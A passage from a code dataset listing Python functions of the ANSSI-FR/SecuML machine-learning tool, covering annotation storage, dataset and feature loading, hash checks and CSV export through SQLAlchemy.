        annotations_type = self.get_annotations_type(annotations_id)
    if annotations_type == AnnotationsTypes.ground_truth and (not self.dataset_conf.has_ground_truth):
        raise NoGroundTruth()
    self.annotations_conf.set_exp_annotations(annotations_id, annotations_type)"
ANSSI-FR/SecuML,add_exp_annotations_in_db,"def add_exp_annotations_in_db(self):
    annotations_type = self.annotations_conf.annotations_type
    exp_annotations = ExpAnnotationsAlchemy(type=annotations_type.name)
    self.session.add(exp_annotations)
    self.session.flush()
    return exp_annotations.id"
ANSSI-FR/SecuML,load_partial_annotations,"def load_partial_annotations(self, filename, annotations_id):
    if filename is None:
        return
    filename = path.join(self.dataset_conf.input_dir(self.secuml_conf), 'annotations', filename)
    if not path.isfile(filename):
        raise SecuMLexpException('The annotations file %s does not exist.' % filename)
    conn = self.session.connection().connection
    cursor = conn.cursor()
    call_specific_db_func(self.secuml_conf.db_type, 'load_partial_annotations', (cursor, filename, annotations_id, self.dataset_conf.dataset_id))
    self.session.flush()"
ANSSI-FR/SecuML,get_annotations_type,"def get_annotations_type(self, annotations_id):
    query = self.session.query(ExpAnnotationsAlchemy)
    query = query.filter(ExpAnnotationsAlchemy.id == annotations_id)
    exp_annotations = query.one()
    return AnnotationsTypes[exp_annotations.type]"
ANSSI-FR/SecuML,get_annotation,"def get_annotation(session, annotations_type, annotations_id, dataset_id, instance_id):
    if annotations_type == AnnotationsTypes.partial:
        return get_instance_partial_annotation(session, annotations_id, instance_id)
    elif annotations_type == AnnotationsTypes.ground_truth:
        return get_instance_ground_truth(session, dataset_id, instance_id)
    elif annotations_type == AnnotationsTypes.ground_truth_if_exists:
        if has_ground_truth(session, dataset_id):
            return get_instance_ground_truth(session, dataset_id, instance_id)
    else:
        return None"
ANSSI-FR/SecuML,get_instance_partial_annotation_row,"def get_instance_partial_annotation_row(session, annotations_id, instance_id):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    query = query.filter(AnnotationsAlchemy.instance_id == int(instance_id))
    try:
        return query.one()
    except NoResultFound:
        return None"
ANSSI-FR/SecuML,get_instance_partial_annotation,"def get_instance_partial_annotation(session, annotations_id, instance_id):
    row = get_instance_partial_annotation_row(session, annotations_id, instance_id)
    if row is None:
        return None
    else:
        return (row.label, row.family)"
ANSSI-FR/SecuML,get_instance_ground_truth,"def get_instance_ground_truth(session, dataset_id, instance_id):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.filter(InstancesAlchemy.id == int(instance_id))
    try:
        row = query.one()
        return (row.label, row.family)
    except NoResultFound:
        return None"
ANSSI-FR/SecuML,get_annotated_instances,"def get_annotated_instances(session, annotations_id):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    return [(r.instance_id, r.label, r.family) for r in query.all()]"
ANSSI-FR/SecuML,get_dataset_families,"def get_dataset_families(session, annotations_id):
    query = session.query(AnnotationsAlchemy.family)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    query = query.distinct(AnnotationsAlchemy.family)
    families = [r.family for r in query.all()]
    return families"
ANSSI-FR/SecuML,has_ground_truth,"def has_ground_truth(session, dataset_id):
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.id == dataset_id)
    return query.one().ground_truth"
ANSSI-FR/SecuML,get_labels_families,"def get_labels_families(session, annotations_type, annotations_id, dataset_id, instance_ids=None, iter_max=None):
    if annotations_type == AnnotationsTypes.ground_truth:
        query = get_labels_families_gt(session, dataset_id, instance_ids)
    elif annotations_type == AnnotationsTypes.ground_truth_if_exists:
        if has_ground_truth(session, dataset_id):
            query = get_labels_families_gt(session, dataset_id, instance_ids)
        else:
            return {}
    elif annotations_type == AnnotationsTypes.partial:
        query = get_labels_families_partial(session, annotations_id, instance_ids, iter_max)
    else:
        assert False
    labels = {}
    for r in query.all():
        label = label_bool_to_str(r.label)
        if label not in list(labels.keys()):
            labels[label] = {}
        labels[label][r.family] = 0
    return labels"
ANSSI-FR/SecuML,get_labels_families_gt,"def get_labels_families_gt(session, dataset_id, instance_ids):
    query = session.query(InstancesAlchemy)
    query = query.distinct(InstancesAlchemy.label, InstancesAlchemy.family)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    if instance_ids is not None:
        query = query.filter(InstancesAlchemy.id.in_(instance_ids))
    return query"
ANSSI-FR/SecuML,get_labels_families_partial,"def get_labels_families_partial(session, annotations_id, instance_ids, iter_max):
    query = session.query(AnnotationsAlchemy)
    query = query.distinct(AnnotationsAlchemy.label, AnnotationsAlchemy.family)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    if iter_max is not None:
        query = query.filter(AnnotationsAlchemy.iteration <= iter_max)
    if instance_ids is not None:
        query = query.filter(AnnotationsAlchemy.instance_id.in_(instance_ids))
    return query"
ANSSI-FR/SecuML,get_label_family_ids,"def get_label_family_ids(session, annotations_type, annotations_id, dataset_id, label, family=None, iter_max=None, instance_ids=None):
    if annotations_type == AnnotationsTypes.ground_truth:
        return get_label_family_ids_gt(session, dataset_id, label, family, instance_ids)
    elif annotations_type == AnnotationsTypes.partial:
        return get_label_family_ids_partial(session, annotations_id, label, family, iter_max, instance_ids)
    else:
        assert False"
ANSSI-FR/SecuML,get_label_family_ids_partial,"def get_label_family_ids_partial(session, annotations_id, label, family, iter_max, instance_ids):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    query = query.filter(AnnotationsAlchemy.label == label)
    if family is not None:
        query = query.filter(AnnotationsAlchemy.family == family)
    if iter_max is not None:
        query = query.filter(AnnotationsAlchemy.iteration <= iter_max)
    if instance_ids is not None:
        query = query.filter(AnnotationsAlchemy.instance_id.in_(instance_ids))
    return [r.instance_id for r in query.all()]"
ANSSI-FR/SecuML,get_label_family_ids_gt,"def get_label_family_ids_gt(session, dataset_id, label, family, instance_ids):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.filter(InstancesAlchemy.label == label)
    if family is not None:
        query = query.filter(InstancesAlchemy.family == family)
    if instance_ids is not None:
        query = query.filter(InstancesAlchemy.id.in_(instance_ids))
    return [r.instance_id for r in query.all()]"
ANSSI-FR/SecuML,get_unlabeled_ids,"def get_unlabeled_ids(session, annotations_type, annotations_id, instance_ids):
    if instance_ids is None:
        assert False
    if annotations_type == AnnotationsTypes.ground_truth:
        return []
    annotated_instances = map(lambda x: x[0], get_annotated_instances(session, annotations_id))
    return list(set(instance_ids) - set(annotated_instances))"
ANSSI-FR/SecuML,get_families_counts,"def get_families_counts(session, annotations_id, iter_max=None, label=None):
    query = session.query(AnnotationsAlchemy.family, func.count(AnnotationsAlchemy.family))
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    if iter_max is not None:
        query = query.filter(AnnotationsAlchemy.iteration <= iter_max)
    if label is not None:
        query = query.filter(AnnotationsAlchemy.label == label)
    query = query.group_by(AnnotationsAlchemy.family)
    family_counts = {}
    for r in query.all():
        family_counts[r[0]] = r[1]
    return family_counts"
ANSSI-FR/SecuML,add_annotation,"def add_annotation(session, annotations_id, instance_id, label, family, iter_num, method):
    annotation = AnnotationsAlchemy(annotations_id=annotations_id, instance_id=int(instance_id), label=label, family=str(family), iteration=iter_num, method=method)
    session.add(annotation)
    session.flush()"
ANSSI-FR/SecuML,update_annotation,"def update_annotation(session, annotations_id, instance_id, label, family, iter_num, method):
    row = get_instance_partial_annotation_row(session, annotations_id, instance_id)
    if row is None:
        add_annotation(session, annotations_id, instance_id, label, family, iter_num, method)
    else:
        row.label = label
        row.family = family
        row.iteration = iter_num
        row.method = method
        session.flush()"
ANSSI-FR/SecuML,remove_annotation,"def remove_annotation(session, annotations_id, instance_id):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.instance_id == instance_id)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    query.delete()"
ANSSI-FR/SecuML,change_family_name,"def change_family_name(session, annotations_id, label, family, new_family):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.label == label)
    query = query.filter(AnnotationsAlchemy.family == family)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    instances = query.all()
    for instance in instances:
        instance.family = new_family
    session.flush()"
ANSSI-FR/SecuML,change_family_label,"def change_family_label(session, annotations_id, label, family):
    query = session.query(AnnotationsAlchemy)
    query = query.filter(AnnotationsAlchemy.label == label)
    query = query.filter(AnnotationsAlchemy.family == family)
    query = query.filter(AnnotationsAlchemy.annotations_id == annotations_id)
    instances = query.all()
    new_label = not label
    for instance in instances:
        instance.label = new_label
    session.flush()"
ANSSI-FR/SecuML,merge_families,"def merge_families(session, annotations_id, label, families, new_family):
    for family in families:
        change_family_name(session, annotations_id, label, family, new_family)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, session):
    self.session = session
    self.project_dataset = ProjectDataset(exp_conf.dataset_conf, exp_conf.secuml_conf, session)
    self.annotations = Annotations(exp_conf.dataset_conf, exp_conf.annotations_conf, exp_conf.secuml_conf, session)
    self.features = LoadFeatures(exp_conf, exp_conf.secuml_conf, session)
    assert self.features.features_conf.files is None"
ANSSI-FR/SecuML,load,"def load(self):
    num_instances = self.project_dataset.load()
    self.annotations.load()
    self.features.load(num_instances)"
ANSSI-FR/SecuML,create_dataset,"def create_dataset(secuml_conf, project, dataset):
    dataset_dir = path.join(secuml_conf.input_data_dir, project, dataset)
    os.makedirs(dataset_dir)
    features_dir = path.join(dataset_dir, 'features')
    os.makedirs(features_dir)
    annotations_dir = path.join(dataset_dir, 'annotations')
    os.makedirs(annotations_dir)
    return (dataset_dir, features_dir, annotations_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, exp=None, user_instance_ids=False):
    self.instances = instances
    self.exp = exp
    self.ids = self.instances.ids.get_ids()
    self.user_instance_ids = None
    if user_instance_ids:
        self.user_instance_ids = idents_tools.get_all_user_instance_ids(self.exp.session, self.exp.exp_conf.dataset_conf.dataset_id)"
ANSSI-FR/SecuML,export_to_secuml,"def export_to_secuml(self, secuml_conf, project, dataset, features_filename):
    (dataset_dir, features_dir, annotations_dir) = create_dataset(secuml_conf, project, dataset)
    self.export_idents(path.join(dataset_dir, 'idents.csv'))
    self.export_features(path.join(features_dir, features_filename))
    description_filename = '_'.join([path.splitext(features_filename)[0], 'description.csv'])
    self.export_features_names(path.join(features_dir, description_filename))
    if not self.instances.has_ground_truth():
        self.export_annotations(path.join(annotations_dir, 'partial_annotations.csv'))"
ANSSI-FR/SecuML,get_print_id,"def get_print_id(self, instance_id):
    print_id = instance_id
    if self.user_instance_ids is not None:
        print_id = self.user_instance_ids[str(instance_id)]
    return print_id"
ANSSI-FR/SecuML,export_idents,"def export_idents(self, output_filename):
    idents = self.instances.ids.idents
    if idents is None:
        idents = ['undefined'] * self.instances.num_instances()
    annotations = None
    has_ground_truth = self.instances.has_ground_truth()
    if has_ground_truth:
        annotations = self.instances.get_annotations(True)
    with open(output_filename, 'w') as f:
        csv_writer = csv.writer(f)
        header = ['instance_id', 'ident']
        if has_ground_truth:
            header.extend(['label', 'family'])
        csv_writer.writerow(header)
        for instance_id in self.ids:
            print_id = self.get_print_id(instance_id)
            values = [print_id, idents[str(instance_id)]]
            if has_ground_truth:
                bool_label = annotations.get_label(instance_id)
                family = annotations.get_family(instance_id)
                values.extend([int(bool_label), family])
            csv_writer.writerow(values)"
ANSSI-FR/SecuML,export_features,"def export_features(self, output_filename):
    header = ['instance_id']
    header.extend(range(self.instances.features.num_features()))
    with open(output_filename, 'w') as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)
        features = self.instances.features
        for instance_id in self.ids:
            print_id = self.get_print_id(instance_id)
            r = [print_id]
            r.extend(features.get_instance_features(instance_id))
            csv_writer.writerow(r)"
ANSSI-FR/SecuML,export_features_names,"def export_features_names(self, output_filename):
    header = ['id', 'name', 'description']
    with open(output_filename, 'w') as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)
        for i in range(self.instances.features.num_features()):
            row = [i, self.instances.features.get_names()[i], self.instances.features.get_descriptions()[i]]
            csv_writer.writerow(row)"
ANSSI-FR/SecuML,export_annotations,"def export_annotations(self, output_filename):
    header = ['instance_id', 'label', 'family']
    annotations = self.instances.get_annotations(False)
    with open(output_filename, 'w') as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)
        for instance_id in self.ids:
            print_id = self.get_print_id(instance_id)
            bool_label = annotations.get_label(instance_id)
            family = annotations.get_family(instance_id)
            row = [print_id, int(bool_label), family]
            csv_writer.writerow(row)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, instance_ids, streaming=False, stream_batch=None):
    features_conf = exp.exp_conf.features_conf
    num_instances = instance_ids.num_instances()
    if streaming:
        values = FeaturesFromExp.get_matrix_iterator(features_conf.files, num_instances)
    else:
        values = FeaturesFromExp.get_matrix(features_conf.files, num_instances, sparse=features_conf.sparse)
    Features.__init__(self, values, exp.exp_conf.features_conf.info, instance_ids, streaming=streaming, stream_batch=stream_batch, sparse=features_conf.sparse)"
ANSSI-FR/SecuML,get_matrix,"@staticmethod
def get_matrix(features_files, num_instances, sparse=False):
    if not sparse:
        iterator = FeaturesFromExp.get_matrix_iterator(features_files, num_instances)
        features = np.vstack(tuple((r for r in iterator)))
    else:
        features = None
        for (_, f_path, f_mask) in features_files:
            indices = np.where(f_mask)[0]
            matrix = load_npz(f_path)[:, indices]
            if features is None:
                features = matrix
            else:
                features = hstack([features, matrix])
    return features"
ANSSI-FR/SecuML,get_matrix_iterator,"@staticmethod
def get_matrix_iterator(features_files, num_instances):
    readers_masks = []
    for (_, f_path, f_mask) in features_files:
        f = open(f_path, 'r')
        f.readline()
        f_reader = csv.reader(f, quoting=csv.QUOTE_NONNUMERIC)
        readers_masks.append((f, f_reader, f_mask))
    for _ in range(num_instances):
        row = None
        for (_, f_reader, f_mask) in readers_masks:
            f_row = np.array(next(f_reader)[1:])[f_mask]
            if row is None:
                row = f_row
            else:
                row = np.hstack((row, f_row))
        yield row
    for (f, _, _) in readers_masks:
        f.close()"
ANSSI-FR/SecuML,get_instance,"@staticmethod
def get_instance(exp, instance_id):
    dataset_id = exp.exp_conf.dataset_conf.dataset_id
    query = exp.session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.filter(InstancesAlchemy.id == instance_id)
    row_number = query.one().row_number
    values = []
    features_conf = exp.exp_conf.features_conf
    for (_, f_path, f_mask) in features_conf.files:
        line = 1
        with open(f_path, 'r') as f_file:
            next(f_file)
            while line < row_number:
                next(f_file)
                line = line + 1
            row = (next(f_file).rstrip(),)
            features_reader = csv.reader(row)
            v = np.array(next(features_reader)[1:])
            if f_mask is not None:
                v = v[f_mask]
            values = np.hstack((values, v))
    values = [float(x) for x in values]
    return (features_conf.info.names, features_conf.info.ids, values)"
ANSSI-FR/SecuML,__init__,"def __init__(self, filename):
    self.filename = filename"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The idents file %s does not exist.' % self.filename"
ANSSI-FR/SecuML,__init__,"def __init__(self, dataset_conf, secuml_conf, session, cursor):
    self.dataset_conf = dataset_conf
    self.secuml_conf = secuml_conf
    self.session = session
    self.cursor = cursor"
ANSSI-FR/SecuML,load,"def load(self):
    (filepath, _) = self.get_filepath_hash()
    has_ground_truth = call_specific_db_func(self.secuml_conf.db_type, 'load_idents', (self.cursor, filepath, self.dataset_conf.dataset_id))
    self.secuml_conf.logger.info('Idents file for the dataset %s/%s loaded into the database (%s).' % (self.dataset_conf.project, self.dataset_conf.dataset, filepath))
    return has_ground_truth"
ANSSI-FR/SecuML,check,"def check(self):
    (filepath, curr_idents_hash) = self.get_filepath_hash()
    dataset_id = self.dataset_conf.dataset_id
    query = self.session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.id == dataset_id)
    idents_hash = query.one().idents_hash
    if idents_hash != curr_idents_hash:
        raise UpdatedFile(filepath, self.dataset_conf.dataset)"
ANSSI-FR/SecuML,get_filepath_hash,"def get_filepath_hash(self):
    input_dir = self.dataset_conf.input_dir(self.secuml_conf)
    filepath = path.join(input_dir, 'idents.csv')
    if not path.isfile(filepath):
        raise IdentsFileNotFound(filepath)
    return (filepath, compute_hash(filepath))"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    query = self.session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == self.dataset_conf.dataset_id)
    return query.count()"
ANSSI-FR/SecuML,get_ident,"def get_ident(session, dataset_id, instance_id):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.filter(InstancesAlchemy.id == instance_id)
    res = query.one()
    return (res.ident, res.user_instance_id)"
ANSSI-FR/SecuML,get_all_user_instance_ids,"def get_all_user_instance_ids(session, dataset_id):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    user_instance_ids = {}
    for r in query.all():
        user_instance_ids[str(r.id)] = r.user_instance_id
    return user_instance_ids"
ANSSI-FR/SecuML,__init__,"def __init__(self, experiment, streaming=False, stream_batch=None):
    self._set_exp_conf(experiment)
    (ids, timestamps, gt_labels, gt_families) = self._get_instances_from_db()
    ids = Ids(ids, timestamps=timestamps)
    ground_truth = Annotations(gt_labels, gt_families, ids)
    features = FeaturesFromExp(experiment, ids, streaming=streaming, stream_batch=stream_batch)
    annotations = self._get_annotations(ids, ground_truth)
    CoreInstances.__init__(self, ids, features, annotations, ground_truth)"
ANSSI-FR/SecuML,_set_exp_conf,"def _set_exp_conf(self, experiment):
    self.experiment = experiment
    self.session = experiment.session
    self.exp_conf = experiment.exp_conf
    self.dataset_conf = experiment.exp_conf.dataset_conf
    self.annotations_conf = experiment.exp_conf.annotations_conf"
ANSSI-FR/SecuML,_get_annotations,"def _get_annotations(self, ids, ground_truth):
    annotations_type = self.annotations_conf.annotations_type
    if annotations_type == AnnotationsTypes.ground_truth:
        if not self.dataset_conf.has_ground_truth:
            raise NoGroundTruth(self.dataset_conf.dataset)
        return ground_truth
    elif annotations_type == AnnotationsTypes.ground_truth_if_exists:
        if not self.dataset_conf.has_ground_truth:
            return Annotations(None, None, ids)
        return ground_truth
    elif annotations_type == AnnotationsTypes.partial:
        annotations = Annotations(None, None, ids)
        db_res = annotations_db_tools.get_annotated_instances(self.session, self.annotations_conf.annotations_id)
        for (instance_id, label, family) in db_res:
            annotations.set_label_family(instance_id, label, family)
        return annotations"
ANSSI-FR/SecuML,_get_instances_from_db,"def _get_instances_from_db(self):
    dataset_id = self.dataset_conf.dataset_id
    query = self.session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.order_by(InstancesAlchemy.id)
    (gt_labels, gt_families) = (None, None)
    if self.dataset_conf.has_ground_truth:
        (ids, timestamps, gt_labels, gt_families) = zip(*[(r.id, r.timestamp, r.label, r.family) for r in query.all()])
        gt_labels = np.array(gt_labels)
        gt_families = np.array(gt_families)
    else:
        (ids, timestamps) = zip(*[(r.id, r.timestamp) for r in query.all()])
    ids = np.array(ids)
    timestamps = np.array(timestamps)
    return (ids, timestamps, gt_labels, gt_families)"
ANSSI-FR/SecuML,__init__,"def __init__(self, input_path):
    self.input_path = input_path"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Invalid features path: %s does not exist.' % self.input_path"
ANSSI-FR/SecuML,__init__,"def __init__(self, input_path, message):
    self.input_path = input_path
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Invalid description for %s. %s' % (self.input_path, self.message)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, secuml_conf, session):
    self.secuml_conf = secuml_conf
    self.dataset_conf = exp_conf.dataset_conf
    self.features_conf = exp_conf.features_conf
    self.session = session"
ANSSI-FR/SecuML,load,"def load(self, num_instances):
    dataset_dir = self.dataset_conf.input_dir(self.secuml_conf)
    self.input_path = os.path.join(dataset_dir, 'features', self.features_conf.input_features)
    (set_id, input_type) = self._check()
    if set_id is None:
        set_id = self._load_features_set(input_type)
        self._load_features_files(set_id, input_type, num_instances)
    self.session.flush()
    self._set_features_conf(set_id, input_type)"
ANSSI-FR/SecuML,_set_features_conf,"def _set_features_conf(self, set_id, input_type):
    self.features_conf.set_set_id(set_id)
    self.features_conf.set_input_type(input_type)
    query = self.session.query(FeaturesFilesAlchemy)
    query = query.filter(FeaturesFilesAlchemy.set_id == set_id)
    query = query.order_by(FeaturesFilesAlchemy.id)
    files = [(r.id, r.path) for r in query.all()]
    filter_in = self._get_filter(self.features_conf.filter_in_f)
    filter_out = self._get_filter(self.features_conf.filter_out_f)
    masks = [None for _ in range(len(files))]
    all_info = FeaturesInfo([], [], [], [])
    for (i, (f_id, f_path)) in enumerate(files):
        (mask, info) = self._get_mask_info(f_id, f_path, filter_in, filter_out)
        masks[i] = mask
        all_info.union(info)
    self.features_conf.set_info(all_info)
    self.features_conf.set_files([(id_, path, masks[i]) for (i, (id_, path)) in enumerate(files)])"
ANSSI-FR/SecuML,_get_mask_info,"def _get_mask_info(self, f_id, f_path, filter_in, filter_out):
    query = self.session.query(FeaturesAlchemy)
    query = query.filter(FeaturesAlchemy.file_id == f_id)
    query = query.order_by(FeaturesAlchemy.id)
    features = [(r.id, r.user_id, r.name, r.description, r.type) for r in query.all()]
    user_ids = [r[1] for r in features]
    if filter_in is not None:
        mask = [user_id in filter_in for user_id in user_ids]
    elif filter_out is not None:
        mask = [user_id not in filter_out for user_id in user_ids]
    else:
        mask = [True for _ in user_ids]
    selection = [(id_, name, desc, FeatureType[type_]) for (i, (id_, _, name, desc, type_)) in enumerate(features) if mask[i]]
    if selection:
        info = FeaturesInfo(*zip(*selection))
    else:
        info = FeaturesInfo([], [], [], [])
    return (mask, info)"
ANSSI-FR/SecuML,_get_filter,"def _get_filter(self, filter_file):
    if filter_file is None:
        return None
    dataset_dir = self.dataset_conf.input_dir(self.secuml_conf)
    features_dir = os.path.join(dataset_dir, 'features')
    with open(os.path.join(features_dir, filter_file)) as f:
        return [r.rstrip() for r in f.readlines()]"
ANSSI-FR/SecuML,_load_features_set,"def _load_features_set(self, input_type):
    features_set = FeaturesSetsAlchemy(dataset_id=self.dataset_conf.dataset_id, name=self.features_conf.input_features, type=input_type.name)
    self.session.add(features_set)
    self.session.flush()
    return features_set.id"
ANSSI-FR/SecuML,_load_features_files,"def _load_features_files(self, set_id, input_type, num_instances):
    if input_type == InputFeaturesTypes.file:
        files = [(self.input_path, self.features_conf.input_features)]
    elif input_type == InputFeaturesTypes.dir:
        files = [(os.path.join(self.input_path, f), f) for f in os.listdir(self.input_path) if '_description' not in f]
    for (file_path, filename) in files:
        self._load_features_file(set_id, file_path, filename, num_instances)"
ANSSI-FR/SecuML,_load_features_file,"def _load_features_file(self, set_id, file_path, filename, num_instances):
    file_hash = compute_hash(file_path)
    features_file = FeaturesFilesAlchemy(set_id=set_id, filename=filename, path=file_path, hash=file_hash)
    self.session.add(features_file)
    self.session.flush()
    self._load_features(set_id, features_file.id, file_path, num_instances)"
ANSSI-FR/SecuML,_load_features,"def _load_features(self, set_id, file_id, file_path, num_instances):
    (user_ids, names, descrips, types) = self._get_ids_types(file_path, num_instances)
    features = [FeaturesAlchemy(user_id=u_id, file_id=file_id, set_id=set_id, name=name, description=desc, type=type_.name) for (u_id, name, desc, type_) in zip(user_ids, names, descrips, types)]
    self.session.bulk_save_objects(features)"
ANSSI-FR/SecuML,_get_ids_types,"def _get_ids_types(self, file_path, num_instances):
    user_ids = None
    names = None
    descriptions = None
    types = None
    (basename, _) = os.path.splitext(file_path)
    description_file = '%s_description.csv' % basename
    if os.path.isfile(description_file):
        with open(description_file, 'r') as f:
            df = pd.read_csv(f, header=0, index_col=0)
            user_ids = [str(i) for i in df.index.values]
            try:
                names = df['name'].values
            except KeyError:
                raise InvalidDescription(file_path, 'The description file must contain a name column. ')
            try:
                descriptions = df['description'].values
            except KeyError:
                pass
            try:
                types = df['type'].values
                try:
                    types = [FeatureType[t] for t in types]
                except KeyError:
                    raise InvalidDescription(file_path, 'Features types must be ""binary"" or ""numeric"".')
            except KeyError:
                pass
    elif self.features_conf.sparse:
        raise InvalidDescription(file_path, 'A description file is required for sparse features. ')
    if not self.features_conf.sparse:
        with open(file_path, 'r') as f_file:
            features_reader = csv.reader(f_file)
            f_user_ids = next(features_reader)[1:]
            if user_ids is None:
                user_ids = f_user_ids
            else:
                if len(names) != len(f_user_ids):
                    raise InvalidDescription(file_path, 'There are %i features, but %i descriptions. ' % (len(user_ids), len(names)))
                if f_user_ids != user_ids:
                    raise InvalidDescription(file_path, 'The ids do not correspond, or are not stored in the same order. ')
    if names is None:
        names = user_ids
    if descriptions is None:
        descriptions = user_ids
    if types is None:
        types = self._get_types(file_path, num_instances)
    return (user_ids, names, descriptions, types)"
ANSSI-FR/SecuML,_get_types,"def _get_types(self, file_path, num_instances):
    features = FeaturesFromExp.get_matrix([(None, file_path, None)], num_instances, sparse=self.features_conf.sparse)
    num_features = features.shape[1]
    types = np.empty((num_features,), dtype=object)
    for i in range(num_features):
        values = features[:, i]
        if all((v in [0, 1] for v in values)):
            types[i] = FeatureType.binary
        else:
            types[i] = FeatureType.numeric
    return types"
ANSSI-FR/SecuML,_check,"def _check(self):
    input_type = self._check_path_exists()
    set_id = self._check_already_loaded(input_type)
    if set_id is not None:
        self._check_hashes(set_id, input_type)
    return (set_id, input_type)"
ANSSI-FR/SecuML,_check_path_exists,"def _check_path_exists(self):
    if os.path.isfile(self.input_path):
        return InputFeaturesTypes.file
    elif os.path.isdir(self.input_path):
        return InputFeaturesTypes.dir
    else:
        raise FeaturesNotFound(self.input_path)"
ANSSI-FR/SecuML,_check_already_loaded,"def _check_already_loaded(self, input_type):
    query = self.session.query(FeaturesSetsAlchemy)
    query = query.filter(FeaturesSetsAlchemy.dataset_id == self.dataset_conf.dataset_id)
    query = query.filter(FeaturesSetsAlchemy.name == self.features_conf.input_features)
    query = query.filter(FeaturesSetsAlchemy.type == input_type.name)
    try:
        set_id = query.one().id
    except NoResultFound:
        set_id = None
    return set_id"
ANSSI-FR/SecuML,_check_hashes,"def _check_hashes(self, set_id, input_type):
    query = self.session.query(FeaturesFilesAlchemy)
    query = query.filter(FeaturesFilesAlchemy.set_id == set_id)
    db_files = {r.filename: r.hash for r in query.all()}
    if input_type == InputFeaturesTypes.file:
        files = [self.features_conf.input_features]
        dataset_dir = self.dataset_conf.input_dir(self.secuml_conf)
        features_path = os.path.join(dataset_dir, 'features')
    elif input_type == InputFeaturesTypes.dir:
        files = [f for f in os.listdir(self.input_path) if '_description' not in f]
        if len(files) != len(db_files):
            raise UpdatedDirectory(self.input_path, db_files.keys(), files)
        features_path = self.input_path
    for filename in files:
        file_path = os.path.join(features_path, filename)
        file_hash = compute_hash(file_path)
        if file_hash != db_files[filename]:
            raise UpdatedFile(file_path, self.dataset_conf.dataset)"
ANSSI-FR/SecuML,rm_project_from_db,"def rm_project_from_db(session, project):
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.project == project)
    if query.first() is None:
        raise UndefinedProject(project)
    query = session.query(ExpAlchemy.id)
    query = query.join(ExpAlchemy.features_set)
    query = query.join(FeaturesSetsAlchemy.dataset)
    query = query.filter(DatasetsAlchemy.project == project)
    all_exps = [x[0] for x in query.all()]
    query = session.query(ExpRelationshipsAlchemy)
    query = query.filter(ExpRelationshipsAlchemy.child_id.in_(all_exps))
    query.delete(synchronize_session='fetch')
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.project == project)
    query.delete()
    session.flush()"
ANSSI-FR/SecuML,get_dataset,"def get_dataset(session, project, dataset):
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.project == project)
    query = query.filter(DatasetsAlchemy.dataset == dataset)
    try:
        return query.one()
    except NoResultFound:
        return None"
ANSSI-FR/SecuML,__init__,"def __init__(self, input_data_dir, project):
    self.input_data_dir = input_data_dir
    self.project = project"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The project directory %s cannot be found in the input_data_dir %s.' % (self.project, self.input_data_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, input_data_dir, project, dataset):
    self.input_data_dir = input_data_dir
    self.project = project
    self.dataset = dataset"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The dataset directory %s cannot be found in the directory %s.' % (self.dataset, path.join(self.input_data_dir, self.project))"
ANSSI-FR/SecuML,__init__,"def __init__(self, project):
    self.project = project"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'There is no experiment for the project %s.' % self.project"
ANSSI-FR/SecuML,__init__,"def __init__(self, dataset_conf, secuml_conf, session):
    self._set_var(dataset_conf, secuml_conf, session)
    self.idents = Idents(self.dataset_conf, self.secuml_conf, self.session, self.cursor)"
ANSSI-FR/SecuML,_set_var,"def _set_var(self, dataset_conf, secuml_conf, session):
    self.secuml_conf = secuml_conf
    self.dataset_conf = dataset_conf
    self.project = dataset_conf.project
    self.dataset = dataset_conf.dataset
    self.session = session
    self.raw_connection = self.session.connection().connection
    self.cursor = self.raw_connection.cursor()"
ANSSI-FR/SecuML,load,"def load(self):
    self._check_input_dataset_dir()
    self._set_dataset_id()
    return self.idents.num_instances()"
ANSSI-FR/SecuML,_check_input_dataset_dir,"def _check_input_dataset_dir(self):
    project_dir = path.join(self.secuml_conf.input_data_dir, self.project)
    if not path.isdir(project_dir):
        raise ProjectDirNotFound(self.secuml_conf.input_data_dir, self.project)
    dataset_dir = path.join(project_dir, self.dataset)
